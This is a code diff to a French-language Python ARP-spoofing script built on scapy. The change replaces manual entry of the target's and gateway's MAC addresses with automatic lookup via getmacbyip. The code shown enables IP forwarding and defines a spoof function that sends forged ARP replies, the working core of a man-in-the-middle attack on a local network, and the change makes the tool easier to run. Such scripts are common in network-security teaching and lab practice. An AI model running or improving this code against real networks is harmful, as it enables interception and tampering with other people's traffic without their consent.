@@ -1,4 +1,4 @@
-from scapy.all import ARP, send
+from scapy.all import ARP, send, getmacbyip
 import time
 import os
 
@@ -51,9 +51,9 @@ print(f"""{VERT}
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 Ip_cible = input("Veuillez entrer l'adresse IP de la cible : ")
-Mac_cible = input("Veuillez entrer l'adresse MAC de la cible : ")
+Mac_cible = getmacbyip(Ip_cible)
 Ip_passerelle = input("Veuillez entrer l'adresse IP de la passerelle : ")
-Mac_passerelle= input("Veuillez entrer l'adresse MAC de la passerelle : ")
+Mac_passerelle= getmacbyip(Ip_passerelle)
 
 def spoof(Ip_dst, Mac_dst,Ip_usurpé):
     packet=ARP(op=2, pdst=Ip_dst, hwdst= Mac_dst, psrc= Ip_usurpé)
